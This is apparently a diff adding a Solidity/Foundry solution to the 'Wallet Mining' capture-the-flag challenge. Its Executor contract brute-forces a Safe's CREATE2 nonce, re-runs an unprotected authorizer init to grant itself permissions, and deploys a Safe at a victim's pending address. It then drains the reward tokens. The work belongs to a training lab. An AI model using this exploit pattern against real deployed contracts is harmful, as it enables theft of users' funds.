@@ -5,12 +5,86 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
 import {
     AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
 } from "../../src/wallet-mining/AuthorizerFactory.sol";
+
+import {ERC20} from "solmate/tokens/ERC20.sol";
+
+contract Executor {
+    WalletDeployer walletDeployer;
+    AuthorizerUpgradeable authorizer;
+    DamnValuableToken token;
+    address singletonCopy;
+    address proxyFactory;
+    address user;
+    address userSafe;
+    address ward;
+
+    constructor(
+        WalletDeployer _walletDeployer,
+        AuthorizerUpgradeable _authorizer,
+        DamnValuableToken _token,
+        address _singletonCopy,
+        address _proxyFactory,
+        address _user,
+        address _userSafe,
+        address _ward
+    ) {
+        walletDeployer = _walletDeployer;
+        authorizer = _authorizer;
+        token = _token;
+        singletonCopy = _singletonCopy;
+        proxyFactory = _proxyFactory;
+        user = _user;
+        userSafe = _userSafe;
+        ward = _ward;
+    }
+
+    function execute() external {
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        bytes memory initializer = abi.encodeCall(
+            Safe.setup,
+            (owners, 1, address(0), "", address(0), address(0), 0, payable(0))
+        );
+
+        bytes32 bytecodeHash = keccak256(
+            abi.encodePacked(
+                type(SafeProxy).creationCode,
+                uint256(uint160(address(singletonCopy)))
+            )
+        );
+
+        uint256 nonce = 0;
+
+        // 1. Find the nonce for the user's Safe contract
+        while (true) {
+            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
+            if (userSafe == Create2.computeAddress(salt, bytecodeHash, proxyFactory)) {
+                break;
+            }
+            nonce++;
+        }
+
+        // 2. Use the init function, so we can authorize this contract to deploy at user safe address
+        address[] memory wards = new address[](1);
+        wards[0] = address(this);
+        address[] memory aims = new address[](1);
+        aims[0] = userSafe;
+        authorizer.init(wards, aims);
+
+        // 3. Deploy a new Safe instance at user safe address
+        walletDeployer.drop(userSafe, initializer, nonce);
+
+        // 4. Send funds to ward's address
+        token.transfer(ward, token.balanceOf(address(this)));
+    }
+}
 
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,11 +193,90 @@ contract WalletMiningChallenge is Test {
         assertEq(token.balanceOf(player), 0);
     }
 
+    struct SafeTxParams {
+        address to;
+        uint256 value;
+        bytes data;
+        Enum.Operation operation;
+        uint256 safeTxGas;
+        uint256 baseGas;
+        uint256 gasPrice;
+        address gasToken;
+        address payable refundReceiver;
+        uint256 nonce;
+        bytes signatures;
+    }
+
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        _deploySafeInstance();
+        _sendFundsToUser();
+    }
+
+    function _deploySafeInstance() internal {
+        Executor executor = new Executor(
+            walletDeployer,
+            authorizer,
+            token,
+            address(singletonCopy),
+            address(proxyFactory),
+            user,
+            USER_DEPOSIT_ADDRESS,
+            ward
+        );
+        executor.execute();
+
+        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));
+
+        assertEq(safe.getOwners().length, 1);
+        assertEq(safe.getOwners()[0], user);
+        assertEq(token.balanceOf(address(safe)), DEPOSIT_TOKEN_AMOUNT);
+    }
+
+    function _sendFundsToUser() internal {
+        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));
+
+        SafeTxParams memory params;
+        params.to = address(token);
+        params.value = 0;
+        params.data = abi.encodeCall(ERC20.transfer, (user, DEPOSIT_TOKEN_AMOUNT));
+        params.operation = Enum.Operation.Call;
+        params.safeTxGas = 0;
+        params.baseGas = 0;
+        params.gasPrice = 0;
+        params.gasToken = address(0);
+        params.refundReceiver = payable(0);
+        params.nonce = safe.nonce();
+
+        bytes32 txHash = safe.getTransactionHash(
+            params.to,
+            params.value,
+            params.data,
+            params.operation,
+            params.safeTxGas,
+            params.baseGas,
+            params.gasPrice,
+            params.gasToken,
+            params.refundReceiver,
+            params.nonce
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+
+        safe.execTransaction(
+            params.to,
+            params.value,
+            params.data,
+            params.operation,
+            params.safeTxGas,
+            params.baseGas,
+            params.gasPrice,
+            params.gasToken,
+            params.refundReceiver,
+            abi.encodePacked(r, s, v)
+        );
     }
 
     /**
